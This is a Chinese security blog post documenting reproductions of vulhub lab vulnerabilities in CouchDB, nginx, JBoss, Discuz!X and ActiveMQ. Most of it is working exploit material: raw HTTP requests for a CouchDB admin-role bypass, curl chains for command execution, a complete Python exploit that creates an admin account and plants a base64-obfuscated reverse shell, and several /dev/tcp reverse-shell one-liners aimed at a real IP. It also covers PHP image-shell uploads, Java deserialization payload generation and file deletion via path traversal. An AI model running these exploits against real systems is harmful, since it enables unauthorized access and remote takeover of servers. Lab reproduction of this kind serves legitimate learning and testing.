<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>vulhub漏洞复现 - co0ontty</title>
    <meta name="author"  content="co0ontty">
    <meta name="description" content="vulhub漏洞复现">
    <meta name="keywords"  content="漏洞复现, WEB, ALL">
    <!-- Open Graph -->
    <meta property="og:title" content="vulhub漏洞复现 - co0ontty">
    <meta property="og:type" content="website">
    <meta property="og:url" content="http://localhost:4000/2019/06/16/vulhub.html">
    <meta property="og:description" content="Walking to Dalao。">
    <meta property="og:site_name" content="co0ontty">
    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
    <link rel="stylesheet" href="/assets/css/github-markdown.css">
    <link rel="stylesheet" href="/assets/css/prism.css">
    <link rel="stylesheet" href="/assets/css/share.min.css">
    <link rel="stylesheet" href="/assets/css/app.min.css">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
	
	<!--
Author: Ray-Eldath
refer to:
 - http://docs.mathjax.org/en/latest/options/index.html
-->

	<script type="text/javascript" async src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
	
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
		jax: ["input/TeX", "output/HTML-CSS"],
		tex2jax: {
			inlineMath: [ ["$", "$"] ],
			displayMath: [ ["$$", "$$"] ],
			skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
		},
		"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
      });
    </script>

	
    <!--
Author: Ray-Eldath
-->
<style>
    .markdown-body .anchor{
        float: left;
        margin-top: -8px;
        margin-left: -20px;
        padding-right: 4px;
        line-height: 1;
        opacity: 0;
    }
    
    .markdown-body .anchor .anchor-icon{
        font-size: 15px
    }
</style>
<script>
    $(document).ready(function() {
        let nodes = document.querySelector(".markdown-body").querySelectorAll("h1,h2,h3")
        for(let node of nodes) {
            var anchor = document.createElement("a")
            var anchorIcon = document.createElement("i")
            anchorIcon.setAttribute("class", "fa fa-anchor fa-lg anchor-icon")
            anchorIcon.setAttribute("aria-hidden", true)
            anchor.setAttribute("class", "anchor")
            anchor.setAttribute("href", "#" + node.getAttribute("id"))
            
            anchor.onmouseover = function() {
                this.style.opacity = "0.4"
            }
            
            anchor.onmouseout = function() {
                this.style.opacity = "0"
            }
            
            anchor.appendChild(anchorIcon)
            node.appendChild(anchor)
        }
    })
</script>
</head>


<body>
  <!--[if lt IE 10]>
<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
<![endif]-->
  <input id="nm-switch" type="hidden" value="true"> <header class="g-header">
    <div class="g-logo">
      <a href="/"></a>
    </div>
    <i id="menu-toggle" class="iconfont icon-menu"></i>
    <nav class="g-nav">
        <ul>
            
            <li><a href="/">首页</a></li>
            
            <li><a href="/tags.html">标签</a></li>
            
            <li><a href="/links.html">友链</a></li>
            
            <li><a href="/about.html">关于我</a></li>
            
        </ul>
    </nav>
</header>


  <header
    class="g-banner post-header post-pattern-circuitBoard bgcolor-default "
    data-theme="default"
  >
    <div class="post-wrapper">
      <div class="post-tags">
        
          
            <a href="http://localhost:4000/tags#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" class="post-tag">漏洞复现</a>
          
            <a href="http://localhost:4000/tags#WEB" class="post-tag">WEB</a>
          
            <a href="http://localhost:4000/tags#ALL" class="post-tag">ALL</a>
          
        
      </div>
      <h1>vulhub漏洞复现</h1>
      <div class="post-meta">
        <span class="post-meta-item"><i class="iconfont icon-author"></i>co0ontty</span>
        <time class="post-meta-item" datetime="19-06-16"><i class="iconfont icon-date"></i>16 Jun 2019</time>
      </div>
    </div>
    
    <div class="filter"></div>
      <div class="post-cover" style="background: url('/assets/img/posts/5cfe32a6be6cf32080.png') center no-repeat; background-size: cover;"></div>
    
  </header>

  <div class="post-content visible">
    

    <article class="markdown-body">
      <h2 id="couchdb-垂直权限绕过漏洞cve-2017-12635">Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h2>

<p><code class="highlighter-rouge">Path:couchdb/CVE-2017-12635</code></p>

<h3 id="漏洞复现">漏洞复现：</h3>

<h4 id="发送创建用户的请求包">发送创建用户的请求包</h4>

<pre><code class="language-textile">PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 96

{

  "type": "user",

  "name": "username",

  "roles": ["_admin"],

  "password": "password"

}
</code></pre>

<p>服务器返回错误，仅允许admin用户添加用户</p>

<p><img src="/assets/img/posts/5cfe35326689f17529.png" alt="5cfe35326689f17529" /></p>

<p>重复发送roles参数，成功绕过限制，创建用户</p>

<pre><code class="language-textile">PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 111

{

  "type": "user",

  "name": "username",

  "roles": ["_admin"],

  "roles":[],

  "password": "password"
}
</code></pre>

<p>成功创建用户</p>

<p><img src="/assets/img/posts/5cfe365ebd34e80865.png" alt="5cfe365ebd34e80865" /></p>

<p>登陆成功</p>

<p><img src="/assets/img/posts/5cfe364f25d8a64339.png" alt="5cfe364f25d8a64339" /></p>

<h2 id="couchdb-任意命令执行漏洞cve-2017-12636">Couchdb 任意命令执行漏洞（CVE-2017-12636）</h2>

<h3 id="漏洞复现-1">漏洞复现：</h3>

<h4 id="version-160">Version 1.6.0</h4>

<p>在CVE-2017-12635的基础上进行任意命令执行操作</p>

<pre><code class="language-textile">curl -X PUT 'http://co0ontty:password@your-ip:5984/_config/query_servers/cmd' -d '"id &gt;/tmp/success"'

curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'
curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://co0ontty:password@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'
</code></pre>

<p>其中 co0ontty:password为用户名和密码</p>

<p>第一个请求是添加一个名字为<code class="highlighter-rouge">cmd</code>的<code class="highlighter-rouge">query_servers</code>，其中<code class="highlighter-rouge">id &gt;/tmp/success</code>为后面要执行的命令</p>

<p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p>

<p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code class="highlighter-rouge">cmd</code>，这里就会用到我第一步里添加的名为<code class="highlighter-rouge">cmd</code>的<code class="highlighter-rouge">query_servers</code>，最后触发命令执行。</p>

<h4 id="version-210">Version 2.1.0</h4>

<p>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问<code class="highlighter-rouge">/_membership</code>即可：</p>

<p>第一个请求修改为：</p>

<pre><code class="language-textile">curl -X PUT http://co0ontty:password@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id &gt;/tmp/success"'
</code></pre>

<p>第二、三个请求不变：</p>

<pre><code class="language-textile">curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'

curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
</code></pre>

<p>由于Couchdb 2.x删除了<code class="highlighter-rouge">_temp_view</code>，所以我们为了触发<code class="highlighter-rouge">query_servers</code>中定义的命令，需要添加一个<code class="highlighter-rouge">_view</code>：</p>

<p>第四个请求修改为：</p>

<pre><code class="language-textile">curl -X PUT http://co0ontty:password@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"
</code></pre>

<p>增加<code class="highlighter-rouge">_view</code>的同时即触发了<code class="highlighter-rouge">query_servers</code>中的命令。</p>

<p>也可以使用python将这一过程连贯运行，并得到反弹shell的效果</p>

<p>补充：</p>

<p>linux环境下可以通过下面这个命令实现反弹shell</p>

<pre><code class="language-textile">sh -i &gt;&amp; /dev/tcp/47.102.143.147/222 0&gt;&amp;1
</code></pre>

<p>/dev/[tcp|upd]/host/port是Linux设备里面比较特殊的文件，读取或写入相当于建立socket调用 
由于其特殊性，命令执行后依旧无法找到/dev/tcp目录更不要说下面的文件了<br />
注意，这里”&amp;”在Linux shell中表示后台运行，当然这里0&gt;&amp;1不是这样,对于&amp;1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO</p>

<p>2&gt;&amp;1形式用于重定向，2&gt;表示错误重定向，&amp;1表示标准输出；以ls &gt;/dev/null 2&gt;&amp;1为例，2&gt;&amp;1是将标准出错重定向到标准输出，不过在这里又被重定向到了/dev/null这个无底洞里
这里有一个问题：为什么2&gt;&amp;1要写在后面，以command &gt;file 2&gt;&amp;1为例，首先是command &gt; file将标准输出重定向到file中， 2&gt;&amp;1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中 
其实还有一个问题，既然2&gt;表示错误重定向，那么0&gt;表示什么呢？查阅资料发现在Linux下输入输出重定向有三个值，其中2已经说过是标准错误信息输出，那0则是标准输入，1则为标准输出了。说到这里，其实又引出了一个新的问题，我们知道&lt;才是表示输入的，那为何这里却是如此形式，按说就应该是2了，或者说这里0就已经是输入了，然后直接使用&gt;进行输出，不是很清楚请大牛指点啊</p>

<p>exp.py:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">'http://47.102.143.147:5984'</span>
<span class="n">command</span> <span class="o">=</span> <span class="n">rb</span><span class="s">"""sh -i &gt;&amp; /dev/tcp/47.102.143.147/222 0&gt;&amp;1"""</span>
<span class="n">version</span> <span class="o">=</span> <span class="mi">2</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">session</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>
<span class="p">}</span>
<span class="c1"># session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
</span><span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/_users/org.couchdb.user:co0ontty'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'''{
  "type": "user",
  "name": "co0ontty",
  "roles": ["_admin"],
  "roles": [],
  "password": "co0ontty"
}'''</span><span class="p">)</span>

<span class="n">session</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'co0ontty'</span><span class="p">,</span> <span class="s">'co0ontty'</span><span class="p">)</span>
<span class="c1"># print (session.auth)
</span><span class="n">command</span> <span class="o">=</span> <span class="s">"bash -c '{echo,</span><span class="si">%</span><span class="s">s}|{base64,-d}|{bash,-i}'"</span> <span class="o">%</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="c1"># print (command)
</span><span class="k">if</span> <span class="n">version</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="p">(</span><span class="s">'/_config/query_servers/cmd'</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/_membership'</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s">'all_nodes'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/_node/{}/_config/query_servers/cmd'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">host</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>

<span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/co0ontty'</span><span class="p">)</span>
<span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/co0ontty/test'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'{"_id": "id"}'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">version</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/co0ontty/_temp_view?limit=10'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'{"language":"cmd","map":""}'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/co0ontty/_design/test'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'{"_id":"_design/test","views":{"co0ontty":{"map":""} },"language":"cmd"}'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="nginx解析漏洞">NGINX解析漏洞</h2>

<p><code class="highlighter-rouge">Path:nginx/nginx_parsing_vulnerability</code></p>

<p>漏洞成因：用户配置不当造成的解析漏洞。</p>

<h3 id="漏洞复现-2">漏洞复现：</h3>

<p><img src="/assets/img/posts/5cffa56981f5625236.png" alt="" /></p>

<p>制作php的图片马进行上传，利用解析漏洞将图片马当做php解析并运行。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span><span class="nx">info</span><span class="p">()</span><span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">copy </span>1.jpg /a + shell.php /b shell.jpg
</code></pre></div></div>

<p>上传图片马，获得上传后的文件物理路径，访问相应的web路径（<a href="http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg">http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg</a>）获得图片</p>

<p><img src="/assets/img/posts/5cffa665698a720426.png" alt="" /></p>

<p>利用解析漏洞访问（<a href="http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php">http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php</a>）成功解析图片为php</p>

<p><img src="/assets/img/posts/5cffa7499b31532778.png" alt="" /></p>

<h2 id="jboss-5x6x-反序列化漏洞-cve-2017-12149">JBoss 5.x/6.x 反序列化漏洞 （CVE-2017-12149）</h2>

<p><code class="highlighter-rouge">Path:jboss/CVE-2017-12149</code></p>

<p>漏洞成因：该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>

<p>在<code class="highlighter-rouge">/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化</p>

<p><img src="/assets/img/posts/5d005ee4c701964038.png" alt="" /></p>

<p>使用常规的Java反序列化漏洞的测试方法来复现该漏洞。</p>

<h3 id="漏洞复现-3">漏洞复现：</h3>

<p>访问<a href="http://47.102.143.147:8080/invoker/readonly">http://47.102.143.147:8080/invoker/readonly</a>发现返回值为500，确定漏洞存在</p>

<p><img src="/assets/img/posts/5d00eee777d7b74150.png" alt="" /></p>

<p>使用Java反序列化利用工具JavaDeserH2HC.zip（http://scan.javasec.cn/java/JavaDeserH2HC.zip） 生成poc.ser</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#编译运行</span>
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
<span class="c1">#生成shell反弹poc</span>
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 47.102.143.147:222
使用curl向服务器发送POST请求（@filename,从文件中读取数据（包括换行符），将读取的数据进行URL编码，然后发送给HTTP服务器）
<span class="nb">curl </span>http://47.102.143.147:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
</code></pre></div></div>

<p><img src="/assets/img/posts/5d00edd1279f283233.png" alt="" /></p>

<h2 id="discuzx-34-任意文件删除漏洞">Discuz!X ≤3.4 任意文件删除漏洞</h2>

<p><code class="highlighter-rouge">Path:discuz/x3.4-arbitrary-deletion</code></p>

<h3 id="漏洞复现-4">漏洞复现：</h3>

<p>登陆Discuz!X搭建的论坛，注册账号，在个人设置界面使用POST发送请求：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">birthprovince</span><span class="o">=../../../</span><span class="nx">test</span><span class="o">.</span><span class="nx">txt</span><span class="o">&amp;</span><span class="nx">profilesubmit</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">formhash</span><span class="o">=</span><span class="nx">e3807b55</span>
</code></pre></div></div>

<p>其中formhash的值为：
<img src="/assets/img/posts/5d0334e5b240c14832.png" alt="" />
发送请求后即刻删除指定的文件:
<img src="/assets/img/posts/5d0334e65501c75422.png" alt="" /></p>

<h2 id="activemq-反序列化漏洞cve-2015-5254">ActiveMQ 反序列化漏洞（CVE-2015-5254）</h2>

<p><code class="highlighter-rouge">Path:activemq/CVE-2015-5254</code></p>

<h3 id="漏洞详情">漏洞详情：</h3>

<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>

<h3 id="漏洞复现-5">漏洞复现：</h3>

<blockquote>
  <p>前提：需要使用管理员权限的账号或者诱导管理员点击固定连接</p>
</blockquote>

<p>· 构造可执行命令的序列化对象<br />
这里使用的是jmet<a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">下载地址</a>，jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。也可以单独使用ysoserial并发送。需要注意的是，使用jmet的时候需要在统计目录中创建一个名为external的文件夹，否则可能报文件夹不存在的错误
· 构造消息传递给目标的61616端口</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="s2">"touch /tmp/success"</span> -Yp ROME your-ip 61616
</code></pre></div></div>

<p><img src="/assets/img/posts/5d04559c3e45c87197.png" alt="" /></p>

<p>· 使用管理员账号登陆管理界面，http://your-ip:8161/admin/browse.jsp? 点击查看消息详情，出发命令执行。</p>

<p><img src="/assets/img/posts/5d0456dc7307223516.png" alt="" /></p>

<p>· 进入docker查看文件创建情况</p>

<p><img src="/assets/img/posts/5d04573291c4e85321.png" alt="" /></p>

<p>· 将运行的命令切换为反弹 shell的命令即可获得目标的shell</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i <span class="o">&gt;</span>&amp; /dev/tcp/47.102.143.147/222 0&gt;&amp;1
</code></pre></div></div>

<p>##</p>

<h1 id="activemq任意文件写入漏洞cve-2016-3088">ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1>

<p><code class="highlighter-rouge">Path:activemq/CVE-2016-3088</code></p>

<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，fileserver无需登录。</p>

<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>

<h4 id="文件上传getshell的几种方法">文件上传getshell的几种方法：</h4>

<p>1、写入webshell，好处是使用的门槛低，但是需要被解析</p>

<p>2、写入cron或者ssh key，可以直接反弹shell，但是需要roo权限</p>

<p>3、写入jar，稍微复杂</p>

<p>4、写入xml配置文件、需要知道activemq的绝对路径</p>

<h4 id="上传webshell">上传webshell</h4>

<blockquote>
  <p>前提条件：拥有后台管理员权限</p>
</blockquote>

<p>首先进入http://47.102.143.147:8161/admin/test/systemProperties.jsp 查看activemq的物理路径：</p>

<p><img src="/assets/img/posts/vulhub.png" alt="" /></p>

    </article>

    
    <div class="social-share-wrapper">
      <div class="social-share"></div>
    </div>
    
  </div>

  <section class="author-detail">
    <section class="post-footer-item author-card">
      <div class="avatar">
        <img src="http://localhost:4000/assets/img/profile.png" alt="">
      </div>
      <div class="author-name" rel="author">co0ontty</div>
      <div class="bio">
        <p>知道创宇实习生</p>
      </div>
      
      <ul class="sns-links">
        
        <li>
          <a href="//weibo.com/5792988237" target="_blank">
                    <i class="iconfont icon-weibo"></i>
                </a>
        </li>
        
        <li>
          <a href="mailto:co0ontty@aliyin.com" target="_blank">
                    <i class="iconfont icon-email"></i>
                </a>
        </li>
        
        <li>
          <a href="//facebook.com/co0ontty" target="_blank">
                    <i class="iconfont icon-facebook"></i>
                </a>
        </li>
        
        <li>
          <a href="//github.com/co0ontty" target="_blank">
                    <i class="iconfont icon-github"></i>
                </a>
        </li>
        
      </ul>
      
    </section>
    <section class="post-footer-item read-next">
      
      <div class="read-next-item">
        <a href="/2019/07/23/nginx.html" class="read-next-link"></a>
        <section>
          <span>Nginx反向代理设置</span>
          <p>环境需求使用nginx配置反向代理，将web根目录与web二级目录映射到不同的ip和端口例如：10.11.10.1...</p>
        </section>
        
     </div>
      

      
      <div class="read-next-item">
        <a href="/2019/06/03/pythonpoc.html" class="read-next-link"></a>
          <section>
            <span>Python编写扫描器</span>
            <p>介绍：本篇学习笔记将记录使用python编写scan的学习路线，记录整个python扫描器的编写过程，记录从第一行...</p>
          </section>
          
          <div class="filter"></div>
          <img src="https://i.loli.net/2019/06/03/5cf52433822b260662.png" alt="">
          
      </div>
      
    </section>
    
  </section>
<div id="lv-container" data-id="city" data-uid="MTAyMC80MTI3My8xNzgyMQ==">
<script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];

       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
   })(document, 'script');
</script>
<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
</div>
  <footer class="g-footer">
  <!-- <section><a href="javascript:scroll(50,50)">回到顶端</a></section> -->
<!-- 网站计数器 -->
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <div style="margin: auto;width: auto;">
      <span id="site_pv_count" title="总点击量"><img src="/assets/vendor/octicons/svg/eye.svg" width=16 height=16 > <span id="busuanzi_value_site_pv"></span></span> &nbsp; &nbsp; | &nbsp; &nbsp; 
    <span id="site_uv_count" title="总访客量"> <img src="/assets/vendor/octicons/svg/person.svg" width=10 height=16> <span id="busuanzi_value_site_uv"></span></span>
    </div>
<!-- 到此为止 -->
  <section>co0ontty ©
  
  
    2018
    -
  
  2019
  </section>
  <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>


</footer>


  <script src="/assets/js/social-share.min.js"></script>
  <script>
    socialShare('.social-share', {
      sites: [
        
          'wechat'
          ,
          
        
          'weibo'
          ,
          
        
          'douban'
          ,
          
        
          'twitter'
          
        
      ],
      wechatQrcodeTitle: "分享到微信朋友圈",
      wechatQrcodeHelper: '<p>扫码后点击右上角</p><p>将本文分享至朋友圈</p>'
    });
  </script>

  
  

  <script src="/assets/js/prism.js"></script>
  <script src="/assets/js/index.min.js"></script>
  <script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?7084bb2b47ca9a611ae8225633e5caeb";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129901756-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-129901756-1');
</script>

</body>

</html>
